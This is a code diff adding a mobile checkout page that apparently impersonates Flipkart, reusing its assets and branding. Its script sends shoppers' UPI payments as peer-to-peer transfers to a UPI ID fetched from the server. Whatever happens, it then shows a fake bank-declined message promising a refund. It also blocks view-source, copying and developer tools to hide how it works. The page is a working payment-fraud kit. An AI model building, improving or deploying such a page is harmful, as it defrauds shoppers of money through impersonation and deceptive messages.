@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Payment - Secure Checkout</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1,user-scalable=no" />
+    <link rel="icon" href="https://static-assets-web.flixcart.com/www/promos/new/20150528-140547-favicon-retina.ico" type="image/png" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v7.0.0/css/fontawesome.css" />
+    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v7.0.0/css/thin.css" />
+    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v7.0.0/css/solid.css" />
+    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v7.0.0/css/regular.css" />
+
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f3f4f6;
+            max-width: 480px;
+            margin: 0 auto;
+            color: #111;
+        }
+
+        header {
+            position: sticky;
+            top: 0;
+            background: #fff;
+            z-index: 30;
+            padding: 12px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .total-card {
+            background: #eff6ff;
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 8px;
+        }
+
+        #upi-panel {
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.3s ease-in-out;
+            opacity: 0;
+            background: #f3f4f6;
+            margin-top: 0;
+        }
+
+        #upi-panel.open {
+            max-height: 400px;
+            opacity: 1;
+            padding: 8px 0;
+        }
+
+        .form-check {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            border-radius: 6px;
+            margin-bottom: 4px;
+            cursor: pointer;
+            background: #fff;
+        }
+
+        .form-check.active {
+            background: #f0f9ff;
+            border: 1px solid #bae6fd;
+        }
+
+        .not-available {
+            opacity: 0.4;
+            pointer-events: none;
+        }
+
+        .payment-row {
+            display: flex;
+            gap: 12px;
+            padding: 12px 16px;
+            background: #fff;
+            align-items: flex-start;
+            cursor: pointer;
+            border-bottom: 1px solid #f3f4f6;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            padding: 7px;
+            border-radius: 8px;
+            z-index: 1000;
+        }
+
+        .modal.show { display: block; }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+        }
+
+        .modal-overlay.show { display: block; }
+
+        .close-btn {
+            display: block;
+            padding: 8px 16px;
+            background: #FFC107;
+            color: black;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .selling_price {
+            color: #1D4ED8;
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .qr-skeleton {
+            width: 230px; height: 230px;
+            border-radius: 18px;
+            background: linear-gradient(110deg, #ececec 8%, #f5f5f5 18%, #ececec 33%);
+            background-size: 200% 100%;
+            animation: skeletonMove 1.2s linear infinite;
+        }
+
+        .qr-skeleton-line {
+            width: 140px; height: 12px;
+            border-radius: 8px;
+            background: linear-gradient(110deg, #ececec 8%, #f5f5f5 18%, #ececec 33%);
+            background-size: 200% 100%;
+            animation: skeletonMove 1.2s linear infinite;
+        }
+
+        @keyframes skeletonMove { to { background-position: -200% 0; } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes scaleIn { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        #qr-code { opacity: 0; transform: scale(.96); transition: .25s ease; }
+        #qr-code.ready { opacity: 1; transform: scale(1); }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <div class="flex flex-col leading-tight">
+                    <span class="text-xs text-gray-600">Step 3 of 3</span>
+                    <span class="text-base font-semibold">Payments</span>
+                </div>
+            </div>
+            <div class="flex items-center gap-1 bg-gray-100 rounded-md px-2 py-1 text-xs text-gray-900">
+                <i class="fa-regular fa-lock-keyhole fa-sm"></i>
+                <span>100% Secure</span>
+            </div>
+        </div>
+
+        <div class="total-card">
+            <div class="flex justify-between items-center">
+                <div class="text-blue-700 font-medium text-base">Total Amount</div>
+                <span class="selling_price font-semibold text-blue-700 text-lg" id="total-amount">₹599</span>
+            </div>
+        </div>
+    </header>
+
+    <section class="bg-white py-4 border-b border-gray-200">
+        <div class="px-4">
+            <div class="bg-green-50 border border-green-100 rounded-md p-3 flex items-center justify-between">
+                <div>
+                    <div class="text-[14px] font-semibold text-green-700">5% Cashback</div>
+                    <div class="text-[12px] text-green-700">Claim now with payment offers</div>
+                </div>
+                <div class="flex items-center gap-2">
+                    <span class="inline-flex items-center justify-center w-7 h-7 rounded-full bg-pink-100">
+                        <img class="w-[16px] h-[16px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/banks/AXIS.svg" />
+                    </span>
+                    <span class="inline-flex items-center justify-center w-7 h-7 rounded-full bg-blue-100">
+                        <img class="w-[16px] h-[16px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/banks/SBI.svg" />
+                    </span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="bg-white divide-y" id="payment-list">
+        <div class="payment-row" id="upi-row">
+            <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/upi.svg" />
+            <div class="flex-1">
+                <div class="flex justify-between items-center">
+                    <h3>UPI</h3>
+                    <i class="fa-solid fa-chevron-down text-xs text-gray-500"></i>
+                </div>
+                <p>Pay by any UPI app</p>
+            </div>
+        </div>
+
+        <div id="upi-panel">
+            <div class="rounded-lg border bg-white pb-2 border-gray-200">
+                <label class="form-check active" pay-type="phonepe">
+                    <div class="flex items-center gap-2">
+                        <img src="assets/images/phonepe.svg" class="w-6 h-6" />
+                        <span class="text-sm font-medium">PhonePe</span>
+                    </div>
+                    <input type="radio" name="upiApp" value="phonepe" class="accent-blue-600" checked />
+                </label>
+
+                <label class="form-check" pay-type="paytm">
+                    <div class="flex items-center gap-2">
+                        <img src="assets/images/paytm_icon.svg" class="w-6 h-6" />
+                        <span class="text-sm font-medium">Paytm</span>
+                    </div>
+                    <input type="radio" name="upiApp" value="paytm" class="accent-blue-600" />
+                </label>
+
+                <label class="form-check" pay-type="qr_upi">
+                    <div class="flex items-center gap-2">
+                        <img src="assets/images/qr.png" class="w-6 h-6" />
+                        <span class="text-sm font-medium">QR Code</span>
+                    </div>
+                    <input type="radio" name="upiApp" value="qr_upi" class="accent-blue-600" />
+                </label>
+
+                <div class="modal-overlay" id="modalOverlay"></div>
+                <div class="modal" id="qrModal">
+                    <div class="modal-content">
+                        <div class="modal-header" style="border:none; padding-bottom:0; background-color:#2874f0;">
+                            <img src="assets/images/Q18Ifxk.png" style="width:100%; padding:0 103px; margin-bottom:10px;"/>
+                        </div>
+                        <div class="modal-body" style="display:flex; padding-top:22px; flex-direction:column; align-items:center; padding:15px 0;">
+                            <div id="qr-loading" class="qr-skeleton-wrap" style="display:none; flex-direction:column; align-items:center; gap:12px; padding:12px 0;">
+                                <div class="qr-skeleton"></div>
+                                <div class="qr-skeleton-line"></div>
+                            </div>
+                            <div id="qr-code" style="margin-top:-20px; margin-bottom:10px;"></div>
+                            <p class="text-center" style="font-size:11px;">Scan the QR Code and Pay from any UPI App</p>
+                            <div class="flex gap-5 py-3">
+                                <img src="assets/images/gpay_icon.svg" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
+                                <img src="assets/images/phonepe.svg" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
+                                <img src="assets/images/paytm_images-n.png" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
+                                <img src="https://img.icons8.com/color/48/bhim.png" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
+                            </div>
+                        </div>
+                        <div style="display:flex; gap:10px; margin-top:0px;">
+                            <button class="close-btn" id="downloadQRBtn" style="flex:1; background:#FFC107;">Download QR</button>
+                            <button class="close-btn" id="closeModal" style="flex:1;">Close QR</button>
+                        </div>
+                    </div>
+                    <div id="qr_amt_modal_scan" style="display:none;">100</div>
+                </div>
+            </div>
+
+            <div id="paymentWaitingOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.45); z-index:999999;">
+                <div style="width:88%; max-width:300px; background:#ffffff; padding:22px 20px; border-radius:14px; margin:170px auto 0; text-align:center; box-shadow:0 6px 30px rgba(0,0,0,0.18); animation:scaleIn .25s ease-out;">
+                    <div style="border:4px solid #e5e7eb; border-top:4px solid #2874f0; width:42px; height:42px; border-radius:50%; margin:5px auto 18px; animation:spin 0.9s linear infinite;"></div>
+                    <div style="font-size:16px; font-weight:600; color:#111;">Processing Payment</div>
+                    <p style="font-size:13px; color:#555; margin-top:6px; line-height:1.45;">Please complete the payment in your UPI app. Do not close this window.</p>
+                    <button id="cancelPaymentBtn" style="margin-top:16px; padding:9px 14px; background:#e5e7eb; border-radius:6px; font-size:13px; font-weight:600; color:#111; border:none; width:100%; cursor:pointer;">Use Different Payment Method</button>
+                </div>
+            </div>
+
+            <div id="paymentFailedPopup" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.45); z-index:999999; animation:fadeIn .25s ease-out;">
+                <div style="width:88%; max-width:320px; background:linear-gradient(145deg,#ffffff,#f4f4f4); padding:28px 24px; border-radius:18px; margin:160px auto 0; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.20); animation:scaleIn .25s ease-out;">
+                    <div style="width:72px; height:72px; margin:0 auto 16px; border-radius:50%; background:#ffe5e5; display:flex; align-items:center; justify-content:center;">
+                        <i class="fa-solid fa-xmark" style="color:#d10000; font-size:40px;"></i>
+                    </div>
+                    <div style="font-size:20px; font-weight:700; color:#c40000; margin-bottom:6px;">Payment Failed</div>
+                    <p style="font-size:14px; color:#555; line-height:1.45; margin-bottom:20px;">The transaction couldn't be completed and was declined by your bank.<br /><br />If any amount has been debited from your account, it will be refunded automatically within <b>1-2 days</b>.</p>
+                    <button id="tryAgainBtn" style="background:#2874f0; padding:11px; width:100%; border-radius:8px; font-weight:600; color:white; font-size:14px; border:none; cursor:pointer;">Try Again</button>
+                </div>
+            </div>
+
+            <div class="py-2 px-4 mt-3">
+                <button id="action-button" class="w-full bg-yellow-400 text-[#111112] px-8 py-2.5 rounded font-semibold hover:bg-yellow-500">
+                    Pay <span class="selling_price" id="btn-amount">₹599</span>
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <div class="bg-white flex items-start gap-3 px-4 py-4 border-b border-gray-100 not-available">
+        <img class="w-[24px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/card.svg" />
+        <div class="flex-1">
+            <div class="flex justify-between">
+                <h3 class="text-[14px] font-semibold">Credit/Debit/ATM Card</h3>
+                <span class="text-xs text-gray-500 font-semibold">Unavailable</span>
+            </div>
+            <p class="text-[12px] text-gray-500">Add and secure cards as per RBI guidelines</p>
+        </div>
+    </div>
+
+    <div class="bg-white flex items-start gap-3 px-4 py-4 border-b border-gray-100 not-available">
+        <img class="w-[24px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/net-banking-08092023.svg" />
+        <div class="flex-1">
+            <div class="flex justify-between">
+                <h3 class="text-[14px] font-semibold">Net Banking</h3>
+                <span class="text-xs text-gray-500 font-semibold">Unavailable</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-white flex items-start gap-3 px-4 py-4 border-b border-gray-100 not-available">
+        <img class="w-[24px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/cash-icon.svg" />
+        <div class="flex-1">
+            <div class="flex justify-between">
+                <h3 class="text-[14px] font-semibold">Cash on Delivery</h3>
+                <span class="text-xs text-gray-500 font-semibold">Unavailable</span>
+            </div>
+        </div>
+    </div>
+
+    <section class="font-semibold flex flex-col items-center px-20 py-10 text-center bg-white">
+        <div class="text-gray-400 text-[17px]">35 Crore happy customers and counting!</div>
+        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/smiley.svg" class="w-[40px]" />
+    </section>
+
+    <footer class="h-20"></footer>
+
+    <script>
+        var GLOBAL_AMOUNT = 599;
+        var paymentUrls = {};
+        var upiData = { upiId: '' };
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const amountParam = urlParams.get('amount');
+            const amount = amountParam ? parseInt(amountParam) : 599;
+            GLOBAL_AMOUNT = amount;
+
+            document.getElementById('total-amount').textContent = '\u20b9' + amount;
+            document.getElementById('btn-amount').textContent = '\u20b9' + amount;
+            document.getElementById('qr_amt_modal_scan').textContent = amount;
+
+            initPaymentUrls();
+            initUPIPanel();
+            initFormChecks();
+            initModal();
+            initPaymentButtons();
+        });
+
+        async function initPaymentUrls() {
+            try {
+                const response = await fetch('/api/upi');
+                const data = await response.json();
+
+                if (!data.active || !data.upiId) {
+                    showPaymentUnavailable();
+                    return;
+                }
+
+                upiData.upiId = data.upiId;
+
+                const amount = GLOBAL_AMOUNT;
+                const phonepePayload = {
+                    contact: { cbcName: "", nickName: "", vpa: upiData.upiId, type: "VPA" },
+                    p2pPaymentCheckoutParams: {
+                        note: "Pay For Order",
+                        isByDefaultKnownContact: true,
+                        initialAmount: Number(amount) * 100,
+                        currency: "INR",
+                        checkoutType: "DEFAULT",
+                        transactionContext: "p2p"
+                    }
+                };
+                const phonepeBase64 = encodeURIComponent(btoa(JSON.stringify(phonepePayload)));
+
+                paymentUrls = {
+                    phonepe: "phonepe://native?data=" + phonepeBase64 + "&id=p2ppayment",
+                    paytm: `paytmmp://cash_wallet?pa=${upiData.upiId}&pn=Order&am=${amount}&cu=INR&tn=Pay For Order&featuretype=money_transfer`,
+                    qr: upiData.upiId
+                };
+            } catch (e) {
+                console.error('Error fetching UPI data:', e);
+                showPaymentUnavailable();
+            }
+        }
+
+        function showPaymentUnavailable() {
+            const paymentList = document.getElementById('payment-list');
+            if (paymentList) {
+                paymentList.innerHTML = `
+                    <div class="flex flex-col items-center justify-center py-16 px-8 text-center bg-white">
+                        <div class="w-16 h-16 rounded-full bg-gray-100 flex items-center justify-center mb-4">
+                            <i class="fa-solid fa-ban text-2xl text-gray-400"></i>
+                        </div>
+                        <h3 class="text-lg font-semibold text-gray-800 mb-2">Payment Methods Not Available</h3>
+                        <p class="text-sm text-gray-500">Please check back later. Payment options are currently being updated.</p>
+                    </div>
+                `;
+            }
+        }
+
+        function initUPIPanel() {
+            const upiRow = document.getElementById('upi-row');
+            const upiPanel = document.getElementById('upi-panel');
+            if (upiRow && upiPanel) {
+                upiRow.addEventListener('click', () => {
+                    upiPanel.classList.toggle('open');
+                });
+                upiPanel.classList.add('open');
+            }
+        }
+
+        function initFormChecks() {
+            document.querySelectorAll('.form-check').forEach(el => {
+                el.addEventListener('click', function() {
+                    document.querySelectorAll('.form-check').forEach(x => x.classList.remove('active'));
+                    this.classList.add('active');
+                    const radio = this.querySelector('input[type="radio"]');
+                    if (radio) radio.checked = true;
+                    updateActionButton();
+                });
+            });
+            updateActionButton();
+        }
+
+        function updateActionButton() {
+            const active = document.querySelector('.form-check.active');
+            const btn = document.getElementById('action-button');
+            if (!active || !btn) return;
+
+            const type = active.getAttribute('pay-type');
+            const amount = GLOBAL_AMOUNT;
+
+            if (type === 'qr_upi') {
+                btn.innerHTML = 'View QR Code';
+                btn.onclick = () => openQRModal();
+            } else {
+                btn.innerHTML = `Pay \u20b9${amount}`;
+                btn.onclick = () => payNow();
+            }
+        }
+
+        function initModal() {
+            const modalOverlay = document.getElementById('modalOverlay');
+            const qrModal = document.getElementById('qrModal');
+            const closeModalBtn = document.getElementById('closeModal');
+            const downloadQRBtn = document.getElementById('downloadQRBtn');
+
+            if (modalOverlay) modalOverlay.addEventListener('click', closeQRModal);
+            if (closeModalBtn) closeModalBtn.addEventListener('click', closeQRModal);
+            if (qrModal) qrModal.addEventListener('click', (e) => e.stopPropagation());
+
+            if (downloadQRBtn) {
+                downloadQRBtn.addEventListener('click', function() {
+                    const box = document.getElementById('qr-code');
+                    if (!box) return;
+                    const canvas = box.querySelector('canvas');
+                    if (!canvas) return;
+                    const dataUrl = canvas.toDataURL('image/png');
+                    const a = document.createElement('a');
+                    a.href = dataUrl;
+                    a.download = 'upi-qr.png';
+                    document.body.appendChild(a);
+                    a.click();
+                    a.remove();
+                });
+            }
+        }
+
+        function openQRModal() {
+            const modalOverlay = document.getElementById('modalOverlay');
+            const qrModal = document.getElementById('qrModal');
+            if (modalOverlay) modalOverlay.classList.add('show');
+            if (qrModal) qrModal.classList.add('show');
+
+            const loading = document.getElementById('qr-loading');
+            const box = document.getElementById('qr-code');
+            if (loading) loading.style.display = 'flex';
+            if (box) { box.innerHTML = ''; box.classList.remove('ready'); }
+
+            requestAnimationFrame(() => generateQR());
+        }
+
+        function closeQRModal() {
+            const modalOverlay = document.getElementById('modalOverlay');
+            const qrModal = document.getElementById('qrModal');
+            if (modalOverlay) modalOverlay.classList.remove('show');
+            if (qrModal) qrModal.classList.remove('show');
+        }
+
+        function generateQR() {
+            const loading = document.getElementById('qr-loading');
+            const box = document.getElementById('qr-code');
+            if (!box) return;
+            if (loading) loading.style.display = 'flex';
+            box.innerHTML = '';
+            box.classList.remove('ready');
+
+            let amount = GLOBAL_AMOUNT;
+            const txn = Math.floor(Math.random() * 9999999999);
+            let upiId = (upiData && upiData.upiId) ? upiData.upiId : (paymentUrls.qr || '');
+            const text = `upi://pay?pa=${encodeURIComponent(upiId)}&pn=Order&am=${amount}&cu=INR&tr=${txn}&tn=${txn}`;
+
+            setTimeout(() => {
+                new QRCode(box, {
+                    text,
+                    width: 230,
+                    height: 230,
+                    correctLevel: QRCode.CorrectLevel.H,
+                });
+                if (loading) loading.style.display = 'none';
+                box.classList.add('ready');
+            }, 280);
+        }
+
+        function initPaymentButtons() {
+            const tryAgainBtn = document.getElementById('tryAgainBtn');
+            if (tryAgainBtn) {
+                tryAgainBtn.onclick = function() {
+                    const fail = document.getElementById('paymentFailedPopup');
+                    if (fail) fail.style.display = 'none';
+                };
+            }
+
+            const cancelPaymentBtn = document.getElementById('cancelPaymentBtn');
+            if (cancelPaymentBtn) {
+                cancelPaymentBtn.onclick = function() {
+                    const ov = document.getElementById('paymentWaitingOverlay');
+                    if (ov) ov.style.display = 'none';
+                };
+            }
+        }
+
+        let failTimer = null;
+
+        function showPaymentWaiting() {
+            const ov = document.getElementById('paymentWaitingOverlay');
+            if (!ov) return;
+            ov.style.display = 'block';
+            failTimer = setTimeout(() => {
+                ov.style.display = 'none';
+                const fail = document.getElementById('paymentFailedPopup');
+                if (fail) fail.style.display = 'block';
+            }, 20000);
+        }
+
+        async function payNow() {
+            const active = document.querySelector('.form-check.active');
+            if (!active) return;
+            const payType = active.getAttribute('pay-type');
+
+            let redirect_url = '';
+            switch (payType) {
+                case 'phonepe':
+                    if (paymentUrls.phonepe) {
+                        showPaymentWaiting();
+                        window.location.href = paymentUrls.phonepe;
+                        return;
+                    }
+                    break;
+                case 'paytm':
+                    if (paymentUrls.paytm) {
+                        redirect_url = paymentUrls.paytm;
+                    }
+                    break;
+                case 'qr_upi':
+                    openQRModal();
+                    return;
+            }
+
+            if (redirect_url) {
+                showPaymentWaiting();
+                setTimeout(() => { window.location.href = redirect_url; }, 200);
+            }
+        }
+
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && ['u','U','s','S','c','C','p','P'].includes(e.key)) e.preventDefault();
+            if (e.keyCode === 123) e.preventDefault();
+        });
+        document.addEventListener('dragstart', (e) => e.preventDefault());
+        document.addEventListener('selectstart', (e) => e.preventDefault());
+    </script>
+</body>
+</html>
